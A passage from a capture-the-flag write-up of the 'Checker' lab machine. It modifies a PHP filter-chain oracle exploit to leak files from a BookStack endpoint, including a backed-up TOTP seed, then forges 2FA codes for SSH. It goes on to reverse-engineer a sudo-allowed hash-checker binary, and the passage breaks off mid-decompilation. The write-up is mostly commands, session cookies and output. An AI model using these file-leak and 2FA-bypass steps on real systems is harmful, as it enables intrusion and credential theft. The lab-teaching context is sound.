class="language-plaintext highlighter-rouge">Requestor</code> class, which is found in <code class="language-plaintext highlighter-rouge">filters_chain_oracle/core/requestor.py</code>. <a href="https://github.com/synacktiv/php_filter_chains_oracle_exploit/blob/main/filters_chain_oracle/core/requestor.py#L11-L13">At the top</a> of the class, it sets <code class="language-plaintext highlighter-rouge">self.file_to_leak</code> to the input file.</p> <p>That is <a href="https://github.com/synacktiv/php_filter_chains_oracle_exploit/blob/main/filters_chain_oracle/core/requestor.py#L107-L109">later</a> used to generate the <code class="language-plaintext highlighter-rouge">filter_chain</code>, which is then merged into the other provided data:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="n">filter_chain</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">'</span><span class="s">php://filter/</span><span class="si">{</span><span class="n">s</span><span class="si">}{</span><span class="n">self</span><span class="p">.</span><span class="n">in_chain</span><span class="si">}</span><span class="s">/resource=</span><span class="si">{</span><span class="n">self</span><span class="p">.</span><span class="n">file_to_leak</span><span class="si">}</span><span class="sh">'</span> <span class="c1"># DEBUG print(filter_chain) </span> <span class="n">merged_data</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="nf">parse_parameter</span><span class="p">(</span><span class="n">filter_chain</span><span class="p">)</span> </code></pre></div></div> <p>From there, it sends the request.</p> <h4 id="modify-poc">Modify POC</h4> <p>To make this work, I’ll need to take the <code class="language-plaintext highlighter-rouge">filter_chain</code> output, base64-encode it, and put it into an image tag. I could build my own script that implements the library, but I’ll go for the hacky solution and modify <code class="language-plaintext highlighter-rouge">requestor.py</code> by importing <code class="language-plaintext highlighter-rouge">b64decode</code> at the top of the file, and then add a line:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="n">filter_chain</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">'</span><span class="s">php://filter/</span><span class="si">{</span><span class="n">s</span><span class="si">}{</span><span class="n">self</span><span class="p">.</span><span class="n">in_chain</span><span class="si">}</span><span class="s">/resource=</span><span class="si">{</span><span class="n">self</span><span class="p">.</span><span class="n">file_to_leak</span><span class="si">}</span><span class="sh">'</span> <span class="c1"># DEBUG print(filter_chain) </span> <span class="n">filter_chain</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">&lt;img src=</span><span class="sh">'</span><span class="s">data:image/png;base64,</span><span class="si">{</span><span class="nf">b64encode</span><span class="p">(</span><span class="n">filter_chain</span><span class="p">.</span><span class="nf">encode</span><span class="p">()).</span><span class="nf">decode</span><span class="p">()</span><span class="si">}</span><span class="sh">'</span><span class="s">/&gt;</span><span class="sh">"</span> <span class="n">merged_data</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="nf">parse_parameter</span><span class="p">(</span><span class="n">filter_chain</span><span class="p">)</span> </code></pre></div></div> <p>I’ll add the <a href="/cheatsheets/uv#add-meta">inline meta</a> to the main script, and now when I run this, it gets <code class="language-plaintext highlighter-rouge">/etc/hostname</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>uv add <span class="nt">--script</span> filters_chain_oracle_exploit.py <span class="nt">-r</span> requirements.txt <span class="go">Updated `filters_chain_oracle_exploit.py` </span><span class="gp">oxdf@hacky$</span><span class="w"> </span>uv run filters_chain_oracle_exploit.py <span class="nt">--verb</span> PUT <span class="nt">--file</span> /etc/hostname <span class="nt">--target</span> http://checker.htb/ajax/page/8/save-draft <span class="nt">--parameter</span> html <span class="nt">--headers</span> <span class="s1">'{"Cookie": "XSRF-TOKEN=eyJpdiI6IjlqMWFOTUI5U0FoTUwzODJWWS9PUmc9PSIsInZhbHVlIjoiOXArTFBZRjMzY1l2dU4zcWtxZUN2dVdvS3Jka1FvdmcrZTN0a0QwSE5Ock43eWhpMlJ1WG9VdHlDcXV6cXVVYkEwQTVpSXpITXhuZ1hLa3FqNEY2VGc0M3owbUF2VWRKUTJtMTRHUXdCb1VCOElydHlYOGxWd0cwdVJLTlBuazkiLCJtYWMiOiI2ZTdmNWY3Y2Q4Mzc1NmI2MTAzYzQ4NWQwZmE0YjE3MTZlYzc1YTEyOGU0NWNjNWEzMmM0NTY0ZTk2YTkyOTk0IiwidGFnIjoiIn0%3D; bookstack_session=eyJpdiI6IldrWmZqQkk0N3A5S0dYd2NDd2lGV3c9PSIsInZhbHVlIjoiL2FSMEhXOWZMeUpkTExnUTNKYmNNck1hOG5FSFBFZGF0MmhJUFJKcXB6K0FGZFArbkZraU9LUWgvVXlINXdyRlJheWp6NEZpemdWNjVGVHpraXVwRzRkVnU4d0c4cWpKNllBMEsxYUxPLzROZkVxY1lhTEFiWmh5WHJJcmxZWE8iLCJtYWMiOiJjOTNhYzljMWRkMWQzNjVhMDVkMTM3NGU3N2FmMjI4NDE3OWRlNDcwMjVmYmQ4NTg0NDUzNjc3ZmNkNDJhYjI0IiwidGFnIjoiIn0%3D; 558fa9b1ffa04df378a1f2bb1a4cceed1e7cc9d4adbbfe21e2=157db5779ec5fdb5c1a8f3bacf00f63d4d3d22235d69f15848", "X-CSRF-TOKEN": "0ifkkNROMkGdJH6oMEH5wAth2ZQlbjAfaC9eSzax"}'</span> <span class="go">Installed 5 packages in 10ms [*] The following URL is targeted : http://checker.htb/ajax/page/8/save-draft [*] The following local file is leaked : /etc/hostname [*] Running PUT requests [*] Additionnal headers used : {"Cookie": "XSRF-TOKEN=eyJpdiI6IjlqMWFOTUI5U0FoTUwzODJWWS9PUmc9PSIsInZhbHVlIjoiOXArTFBZRjMzY1l2dU4zcWtxZUN2dVdvS3Jka1FvdmcrZTN0a0QwSE5Ock43eWhpMlJ1WG9VdHlDcXV6cXVVYkEwQTVpSXpITXhuZ1hLa3FqNEY2VGc0M3owbUF2VWRKUTJtMTRHUXdCb1VCOElydHlYOGxWd0cwdVJLTlBuazkiLCJtYWMiOiI2ZTdmNWY3Y2Q4Mzc1NmI2MTAzYzQ4NWQwZmE0YjE3MTZlYzc1YTEyOGU0NWNjNWEzMmM0NTY0ZTk2YTkyOTk0IiwidGFnIjoiIn0%3D; bookstack_session=eyJpdiI6IldrWmZqQkk0N3A5S0dYd2NDd2lGV3c9PSIsInZhbHVlIjoiL2FSMEhXOWZMeUpkTExnUTNKYmNNck1hOG5FSFBFZGF0MmhJUFJKcXB6K0FGZFArbkZraU9LUWgvVXlINXdyRlJheWp6NEZpemdWNjVGVHpraXVwRzRkVnU4d0c4cWpKNllBMEsxYUxPLzROZkVxY1lhTEFiWmh5WHJJcmxZWE8iLCJtYWMiOiJjOTNhYzljMWRkMWQzNjVhMDVkMTM3NGU3N2FmMjI4NDE3OWRlNDcwMjVmYmQ4NTg0NDUzNjc3ZmNkNDJhYjI0IiwidGFnIjoiIn0%3D; 558fa9b1ffa04df378a1f2bb1a4cceed1e7cc9d4adbbfe21e2=157db5779ec5fdb5c1a8f3bacf00f63d4d3d22235d69f15848", "X-CSRF-TOKEN": "0ifkkNROMkGdJH6oMEH5wAth2ZQlbjAfaC9eSzax"} [+] File /etc/hostname leak is finished! Y2hlY2tl b'checke' </span></code></pre></div></div> <p>I have to include active cookies and the <code class="language-plaintext highlighter-rouge">X-CSRF-TOKEN</code> header from a valid request.</p> <p>It’s worth nothing that this is a brute force approach, and it’s rather slow. It’s also probably missing a last character “r”, though hard to say for sure at this point.</p> <h3 id="shell">Shell</h3> <h4 id="read-2fa-seed">Read 2FA Seed</h4> <p>I have a user, reader, and their password that works for SSH, but 2FA is enabled. Searching for things like “Linux SSH 2fa” returns <a href="https://ubuntu.com/tutorials/configure-ssh-2fa#1-overview">tutorials</a> that show how to set up Google Authenticator. This application stores it’s 2FA seed value in <code class="language-plaintext highlighter-rouge">~/.google_authenticator</code>.</p> <p>I can’t directly read <code class="language-plaintext highlighter-rouge">/home/reader/.google_authenticator</code>. That makes sense, as that file is typically not readable by anyone other than the user it belongs to (and actually will fail is the permissions are too broad). But I can try in the <code class="language-plaintext highlighter-rouge">/backup</code> directory leaks on the post, and it works:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>uv run filters_chain_oracle_exploit.py <span class="nt">--verb</span> PUT <span class="nt">--file</span> /backup/home_backup/home/reader/.google_authenticator <span class="nt">--target</span> http://checker.htb/ajax/page/8/save-draft <span class="nt">--parameter</span> html <span class="nt">--headers</span> <span class="s1">'{"Cookie": "XSRF-TOKEN=eyJpdiI6IjlqMWFOTUI5U0FoTUwzODJWWS9PUmc9PSIsInZhbHVlIjoiOXArTFBZRjMzY1l2dU4zcWtxZUN2dVdvS3Jka1FvdmcrZTN0a0QwSE5Ock43eWhpMlJ1WG9VdHlDcXV6cXVVYkEwQTVpSXpITXhuZ1hLa3FqNEY2VGc0M3owbUF2VWRKUTJtMTRHUXdCb1VCOElydHlYOGxWd0cwdVJLTlBuazkiLCJtYWMiOiI2ZTdmNWY3Y2Q4Mzc1NmI2MTAzYzQ4NWQwZmE0YjE3MTZlYzc1YTEyOGU0NWNjNWEzMmM0NTY0ZTk2YTkyOTk0IiwidGFnIjoiIn0%3D; bookstack_session=eyJpdiI6IldrWmZqQkk0N3A5S0dYd2NDd2lGV3c9PSIsInZhbHVlIjoiL2FSMEhXOWZMeUpkTExnUTNKYmNNck1hOG5FSFBFZGF0MmhJUFJKcXB6K0FGZFArbkZraU9LUWgvVXlINXdyRlJheWp6NEZpemdWNjVGVHpraXVwRzRkVnU4d0c4cWpKNllBMEsxYUxPLzROZkVxY1lhTEFiWmh5WHJJcmxZWE8iLCJtYWMiOiJjOTNhYzljMWRkMWQzNjVhMDVkMTM3NGU3N2FmMjI4NDE3OWRlNDcwMjVmYmQ4NTg0NDUzNjc3ZmNkNDJhYjI0IiwidGFnIjoiIn0%3D; 558fa9b1ffa04df378a1f2bb1a4cceed1e7cc9d4adbbfe21e2=157db5779ec5fdb5c1a8f3bacf00f63d4d3d22235d69f15848", "X-CSRF-TOKEN": "0ifkkNROMkGdJH6oMEH5wAth2ZQlbjAfaC9eSzax"}'</span> <span class="go">[*] The following URL is targeted : http://checker.htb/ajax/page/8/save-draft [*] The following local file is leaked : /backup/home_backup/home/reader/.google_authenticator [*] Running PUT requests [*] Additionnal headers used : {"Cookie": "XSRF-TOKEN=eyJpdiI6IjlqMWFOTUI5U0FoTUwzODJWWS9PUmc9PSIsInZhbHVlIjoiOXArTFBZRjMzY1l2dU4zcWtxZUN2dVdvS3Jka1FvdmcrZTN0a0QwSE5Ock43eWhpMlJ1WG9VdHlDcXV6cXVVYkEwQTVpSXpITXhuZ1hLa3FqNEY2VGc0M3owbUF2VWRKUTJtMTRHUXdCb1VCOElydHlYOGxWd0cwdVJLTlBuazkiLCJtYWMiOiI2ZTdmNWY3Y2Q4Mzc1NmI2MTAzYzQ4NWQwZmE0YjE3MTZlYzc1YTEyOGU0NWNjNWEzMmM0NTY0ZTk2YTkyOTk0IiwidGFnIjoiIn0%3D; bookstack_session=eyJpdiI6IldrWmZqQkk0N3A5S0dYd2NDd2lGV3c9PSIsInZhbHVlIjoiL2FSMEhXOWZMeUpkTExnUTNKYmNNck1hOG5FSFBFZGF0MmhJUFJKcXB6K0FGZFArbkZraU9LUWgvVXlINXdyRlJheWp6NEZpemdWNjVGVHpraXVwRzRkVnU4d0c4cWpKNllBMEsxYUxPLzROZkVxY1lhTEFiWmh5WHJJcmxZWE8iLCJtYWMiOiJjOTNhYzljMWRkMWQzNjVhMDVkMTM3NGU3N2FmMjI4NDE3OWRlNDcwMjVmYmQ4NTg0NDUzNjc3ZmNkNDJhYjI0IiwidGFnIjoiIn0%3D; 558fa9b1ffa04df378a1f2bb1a4cceed1e7cc9d4adbbfe21e2=157db5779ec5fdb5c1a8f3bacf00f63d4d3d22235d69f15848", "X-CSRF-TOKEN": "0ifkkNROMkGdJH6oMEH5wAth2ZQlbjAfaC9eSzax"} [+] File /backup/home_backup/home/reader/.google_authenticator leak is finished! RFZEQlJBT0RMQ1dGN0kyT05BNEs1TFFMVUUKIiBUT1RQX0FVVEgK b'DVDBRAODLCWF7I2ONA4K5LQLUE\n" TOTP_AUTH\n' </span></code></pre></div></div> <h4 id="generate-code">Generate Code</h4> <p>That seed, along with the current time, is what is used to generate the 2FA six-digit number. I’ll generate them locally with <code class="language-plaintext highlighter-rouge">oathtool</code> (<code class="language-plaintext highlighter-rouge">apt install oathtool</code>):</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>oathtool <span class="nt">-b</span> <span class="nt">--totp</span> DVDBRAODLCWF7I2ONA4K5LQLUE <span class="go">538822 </span></code></pre></div></div> <p>This doesn’t work for me:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ssh reader@checker.htb <span class="go">(reader@checker.htb) Password: (reader@checker.htb) Verification code: Error "Operation not permitted" while writing config (reader@checker.htb) Password: </span></code></pre></div></div> <p>This error message is confusing. It doesn’t look like an error for the code being wrong. In fact, if I try again and put in 123456 as the code, it just prompts for the password again:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ssh reader@checker.htb <span class="go">(reader@checker.htb) Password: (reader@checker.htb) Verification code: (reader@checker.htb) Password: </span></code></pre></div></div> <p>Still, that is still an error for the code not being quite right (I think it’s because it’s only a few minutes off).</p> <p>When troubleshooting 2FA, the first thing to check is the time. A nice way to get that is from the HTTP server headers. It looks like Checker is a little less than two minutes ahead of my box:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">-v</span> http://checker.htb <span class="nt">-s</span> 2&gt;&amp;1 | <span class="nb">grep </span>Date | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">' '</span> <span class="nt">-f</span> 4-<span class="p">;</span> <span class="nb">date</span> <span class="go">24 Feb 2025 15:38:37 GMT Mon Feb 24 03:36:59 PM UTC 2025 </span></code></pre></div></div> <p>I’ll use this one-liner to get the token from the time on Checker:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>oathtool <span class="nt">-b</span> <span class="nt">--totp</span> DVDBRAODLCWF7I2ONA4K5LQLUE <span class="nt">--now</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">date</span> <span class="nt">-d</span> <span class="s2">"</span><span class="si">$(</span>curl <span class="nt">-v</span> http://checker.htb <span class="nt">-s</span> 2&gt;&amp;1 | <span class="nb">grep </span>Date | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">' '</span> <span class="nt">-f</span> 3- | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'\r'</span><span class="si">)</span><span class="s2">"</span> <span class="s2">"+%Y-%m-%d %H:%M:%S"</span><span class="si">)</span><span class="s2">"</span> <span class="go">579533 </span></code></pre></div></div> <p>It’s using <code class="language-plaintext highlighter-rouge">curl</code> with <code class="language-plaintext highlighter-rouge">grep</code> and <code class="language-plaintext highlighter-rouge">cut</code> to get the date from the webserver, and then <code class="language-plaintext highlighter-rouge">date</code> to convert it to the needed format. It works:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ssh reader@checker.htb <span class="go">(reader@checker.htb) Password: (reader@checker.htb) Verification code: Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-131-generic x86_64) ...[snip]... </span><span class="gp">reader@checker:~$</span><span class="w"> </span></code></pre></div></div> <p>And I can grab <code class="language-plaintext highlighter-rouge">user.txt</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">reader@checker:~$</span><span class="w"> </span><span class="nb">cat </span>user.txt <span class="go">40dfa1de************************ </span></code></pre></div></div> <h2 id="shell-as-root">Shell as root</h2> <h3 id="enumeration">Enumeration</h3> <h4 id="users">Users</h4> <p>There are no other users with home directories in <code class="language-plaintext highlighter-rouge">/home</code>, or with shells configured in <code class="language-plaintext highlighter-rouge">/etc/passwd</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">reader@checker:~$</span><span class="w"> </span><span class="nb">ls</span> /home/ <span class="go">reader </span><span class="gp">reader@checker:~$</span><span class="w"> </span><span class="nb">grep</span> <span class="s1">'sh$'</span> /etc/passwd <span class="go">root:x:0:0:root:/root:/bin/bash reader:x:1000:1000::/home/reader:/bin/bash </span></code></pre></div></div> <p>reader’s home directory is very empty:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">reader@checker:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span> <span class="go">total 36 drwxr-x--- 4 reader reader 4096 Feb 24 15:37 . drwxr-xr-x 3 root root 4096 Jun 12 2024 .. lrwxrwxrwx 1 root root 9 Feb 6 04:07 .bash_history -&gt; /dev/null -rw-r--r-- 1 reader reader 220 Jan 6 2022 .bash_logout -rw-r--r-- 1 reader reader 3771 Jan 6 2022 .bashrc drwx------ 2 reader reader 4096 Jun 15 2024 .cache -r-------- 1 reader reader 39 Jun 14 2024 .google_authenticator drwxrwxr-x 3 reader reader 4096 Jun 15 2024 .local -rw-r--r-- 1 reader reader 807 Jan 6 2022 .profile -rw-r----- 1 root reader 33 Jun 12 2024 user.txt </span></code></pre></div></div> <h4 id="sudo">sudo</h4> <p>reader is able to run <code class="language-plaintext highlighter-rouge">/opt/hash-checker/check-leak.sh</code> with arguments as root without a password:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">reader@checker:~$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span> <span class="go">Matching Defaults entries for reader on checker: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty User reader may run the following commands on checker: (ALL) NOPASSWD: /opt/hash-checker/check-leak.sh * </span></code></pre></div></div> <h4 id="opthash-checker">/opt/hash-checker</h4> <p><code class="language-plaintext highlighter-rouge">/opt/hash-checker</code> contains five files:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">reader@checker:/opt/hash-checker$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span> <span class="go">total 68 drwxr-xr-x 2 root root 4096 Jan 30 17:09 . drwxr-xr-x 5 root root 4096 Jan 30 17:04 .. -r-------- 1 root root 118 Jan 30 17:07 .env -rwxr--r-- 1 root root 141 Jan 30 17:04 check-leak.sh -rwxr--r-- 1 root root 42376 Jan 30 17:02 check_leak -rwx------ 1 root root 750 Jan 30 17:07 cleanup.sh -rw-r--r-- 1 root root 1464 Jan 30 17:09 leaked_hashes.txt </span></code></pre></div></div> <p>The <code class="language-plaintext highlighter-rouge">.env</code> file will likely have the environment variables for the run, but it can’t be read by reader. Similarly, <code class="language-plaintext highlighter-rouge">cleanup.sh</code> can’t be read.</p> <p><code class="language-plaintext highlighter-rouge">leaked_hashes.txt</code> has 24 bcrypt hashes:</p> <div class="language-console code-collapse highlighter-rouge" data-trunc="300"><div class="highlight"><pre class="highlight"><code><span class="gp">reader@checker:/opt/hash-checker$ </span><span class="nb">wc</span> <span class="nt">-l</span> leaked_hashes.txt <span class="go">24 leaked_hashes.txt </span><span class="gp">reader@checker:/opt/hash-checker$ </span><span class="nb">cat </span>leaked_hashes.txt <span class="go">$2b$10$rbzaxiT.zUi.e28wm2ja8OGx.jNamreNFQC6Kh/LeHufCmduH8lvy $2b$10$Tkd9LwWOOzR.DWdzj9aSp.Bh.zQnxZahKel4xMjxLIHzdostFVqsK $2b$10$a/lpwbKF6pyAWeGHCVARz.JOi3xtNzGK..GZON/cFhNi1eyMi4UIC $2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy $2b$10$DanymKXfnu1ZTrRh3JwBhuPsmjgOEBJLNEEmLPAAIfG9kiOI28fIC $2b$10$/GwrAIQczda3O5.rnGb4IOqEE/JMU4TIcy95ECSh/pZBQzhlWITQ. $2b$10$Ef6TBE9GdSsjUPwjm0NYlurGfVO/GdtaCsWBpVRPnQsCbYgf4oU8a $2b$10$/KLwuhoXHfyKpq1qj8BDcuzNyhR0h0g27jl0yiX7BpBL9kO.wFWii $2b$10$Ito9FRIN9DgMHWn20Zgfa.yKKlJ.HedScxyvymCxMYTWaZANHIzvO $2b$10$J025XtUSjTm.kUfa19.6geInkfiISIjkr7unHxT4V/XDIl.2LYrZ2 $2b$10$g962m7.wovzDRPI/4l0GEOviIs2WUPBqlkPgVAPfsYpa138dd9aYK $2b$10$keolOsecWXEyDIN/zDPVbuc/UOjGjnZGblpdBPQAfZDVm2fRIDUCq $2b$10$y2Toog209OyRWk6z7S7XNOAkVBijv3HwNBpKk.R1bPCYuR8WxrL66 $2b$10$O4OQizv0TVsWxWi26tg8Xu3SCS29ZEv9JqwlY5ED240qW8V0eyG7a $2b$10$/1ePaOFZrcpNHWFk72ZNpepXRvXIi1zMSBYBGGqxfUlxw/JiQQvCG $2b$10$/0az8KLoanuz3rfiN.Ck9./Mt6IHxs5OGtKbgM31Z0NH9maz1hPDe $2b$10$VGR3JK.E0Cc3OnY9FuB.u.qmwFBBRCrRLAvUlPnO5QW5SpD1tEeDO $2b$10$9p/iOwsybwutYoL3xc5jaeCmYu7sffW/oDq3mpCUf4NSZtq2CXPYC $2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy $2b$10$8cXny33Ok0hbi2IY46gjJerQkEgKj.x1JJ6/orCvYdif07/tD8dUK $2b$10$QAcqcdyu1T1qcpM4ZQeM6uJ3dXw2eqT/lUUGZvNXzhYqcEEuwHrvS $2b$10$M1VMeJrjgaIbz2g2TCm/ou2srr4cd3c18gxLA32NhvpXwxo3P5DZW $2b$10$rxp3yM98.NcbD3NeHLjGUujzIEWYJ5kiSynHOHo0JvUvXq6cBLuRO $2b$10$ZOUUTIj7JoIMwoKsXVOsdOkTzKgHngBCqkt.ASKf78NUwfeIB4glK </span></code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">check-leak.sh</code> is a simple Bash script:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reader@checker:/opt/hash-checker<span class="nv">$ </span><span class="nb">cat </span>check-leak.sh <span class="c">#!/bin/bash</span> <span class="nb">source</span> <span class="sb">`</span><span class="nb">dirname</span> <span class="nv">$0</span><span class="sb">`</span>/.env <span class="nv">USER_NAME</span><span class="o">=</span><span class="si">$(</span>/usr/bin/echo <span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span> | /usr/bin/tr <span class="nt">-dc</span> <span class="s1">'[:alnum:]'</span><span class="si">)</span> /opt/hash-checker/check_leak <span class="s2">"</span><span class="nv">$USER_NAME</span><span class="s2">"</span> </code></pre></div></div> <p>It loads the environment variables from <code class="language-plaintext highlighter-rouge">.env</code> in the same directory as the script. It sanitizes the first argument by removing any non-alphanumeric characters and storing that as the <code class="language-plaintext highlighter-rouge">USER_NAME</code>. Then it calls <code class="language-plaintext highlighter-rouge">/opt/hash-checker/check_leak</code> with the <code class="language-plaintext highlighter-rouge">USER_NAME</code> as the argument.</p> <h3 id="check_leak">check_leak</h3> <h4 id="run-it">Run It</h4> <p>Only root can run <code class="language-plaintext highlighter-rouge">check_leak</code> currently. I can make a copy and run it as reader:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">reader@checker:/opt/hash-checker$</span><span class="w"> </span><span class="nb">cp </span>check_leak /tmp/ <span class="gp">reader@checker:/opt/hash-checker$</span><span class="w"> </span>/tmp/check_leak <span class="go">Error: Missing database credentials in environment </span></code></pre></div></div> <p>It’s trying to make a DB connection.</p> <p>I’ll run it with <code class="language-plaintext highlighter-rouge">sudo</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">reader@checker:/opt/hash-checker$</span><span class="w"> </span><span class="nb">sudo</span> /opt/hash-checker/check-leak.sh <span class="go">Error: &lt;USER&gt; is not provided. </span><span class="gp">reader@checker:/opt/hash-checker$</span><span class="w"> </span><span class="nb">sudo</span> /opt/hash-checker/check-leak.sh reader <span class="go">User not found in the database. </span><span class="gp">reader@checker:/opt/hash-checker$</span><span class="w"> </span><span class="nb">sudo</span> /opt/hash-checker/check-leak.sh admin <span class="go">User is safe. </span><span class="gp">reader@checker:/opt/hash-checker$</span><span class="w"> </span><span class="nb">sudo</span> /opt/hash-checker/check-leak.sh bob <span class="go">Password is leaked! Using the shared memory 0xA097B as temp location User will be notified via bob@checker.htb </span></code></pre></div></div> <p>It seems that the options are that the user is not in the DB, that the user is safe, or that the user’s password has leaked. I can guess that it’s doing some comparison between the user’s hash and the hashes in the txt file.</p> <p>The use of shared memory is interesting, and something I’ll exploit.</p> <h4 id="main">main</h4> <p>I’ll copy the binary back to my host and open it in Ghidra. The main function gets the variables from the environment:</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="n">DB_HOST</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">"DB_HOST"</span><span class="p">);</span> <span class="n">DB_USER</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">"DB_USER"</span><span class="p">);</span> <span class="n">DB_PASSWORD</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">"DB_PASSWORD"</span><span class="p">);</span> <span class="n">DB_NAME</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">"DB_NAME"</span><span class="p">);</span> </code></pre></div></div> <p>It validates that the argument (the username) is 20 or less characters and exists before calling <code class="language-plaintext highlighter-rouge">fetch_hash_from_db</code>:</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">hash</span> <span class="o">=</span> <span class="n">fetch_hash_from_db</span><span class="p">(</span><span class="n">DB_HOST</span><span class="p">,</span><span class="n">DB_USER</span><span class="p">,</span><span class="n">DB_PASSWORD</span><span class="p">,</span><span class="n">DB_NAME</span><span class="p">,</span><span class="n">hash</span><span class="p">);</span> </code></pre></div></div> <p>This function returns a hash from the database associated with the username. If it is empty (the user doesn’t exist), it prints that. Otherwise, it calls another function, and processes the result:</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="n">hash_in_file</span> <span class="o">=</span> <span class="n">check_bcrypt_in_file</span><span class="p">(</span><span class="s">"/opt/hash-checker/leaked_hashes.txt"</span><span class="p">,</span><span class="n">hash</span><span class="p">);</span> <span class="k">if</span> <span class="p">((</span><span class="kt">char</span><span class="p">)</span><span class="n">hash_in_file</span> <span class="o">==</span> <span class="sc">'\0'</span><span class="p">)</span> <span class="p">{</span> <span class="n">puts</span><span class="p">(</span><span class="s">"User is safe."</span><span class="p">);</span> <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="n">puts</span><span class="p">(</span><span class="s">"Password is leaked!"</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="n">DAT_8001913c</span> <span class="o">!=</span> <span class="sc">'\0'</span><span class="p">)</span> <span class="p">{</span> <span class="n">__asan_report_load8</span><span class="p">(</span><span class="o">&amp;</span><span class="n">stdout</span><span class="p">);</span> <span class="p">}</span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span> <span class="n">shm_key</span> <span class="o">=</span> <span class="n">write_to_shm</span><span class="p">(</span><span class="n">hash</span><span class="p">);</span> <span class="n">printf</span><span class="p">(</span><span class="s">"Using the shared memory 0x%X as temp location</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">shm_key</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="n">DAT_8001913c</span> <span class="o">!=</span> <span class="sc">'\0'</span><span class="p">)</span> <span class="p">{</span> <span class="n">__asan_report_load8</span><span class="p">(</span><span class="o">&amp;</span><span class="n">stdout</span><span class="p">);</span> <span class="p">}</span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span> <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="n">notify_user</span><span class="p">(</span><span class="n">DB_HOST</span><span class="p">,</span><span class="n">DB_USER</span><span class="p">,</span><span class="n">DB_PASSWORD</span><span class="p">,</span><span class="n">DB_NAME</span><span class="p">,</span><span class="n">shm_key</span><span class="p">);</span> <span class="n">clear_shared_memory</span><span class="p">(</span><span class="n">shm_key</span><span class="p">);</span> <span class="p">}</span> <span class="n">free</span><span class="p">(</span><span class="n">hash</span><span class="p">);</span> </code></pre></div></div> <p>If the function returns false, then it prints that the user is safe. Otherwise, it prints the “Password is leaked” message, and then processes it, first by calling <code class="language-plaintext highlighter-rouge">write_to_shm</code>. Then the result from that call is printed and passed to <code class="language-plaintext highlighter-rouge">notify_user</code> <em>after</em> a one second sleep. Then <code class="language-plaintext highlighter-rouge">clear_shared_memory</code> is called.</p> <h4 id="write_to_shm">write_to_shm</h4> <p><code class="language-plaintext highlighter-rouge">write_to_shm</code> seeds and calls <code class="language-plaintext highlighter-rouge">rand</code> to get a random key, and then uses that to call <code class="language-plaintext highlighter-rouge">shmget</code>, fetching a space in shared memory:</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="n">now_stamp</span> <span class="o">=</span> <span class="n">time</span><span class="p">((</span><span class="kt">time_t</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span 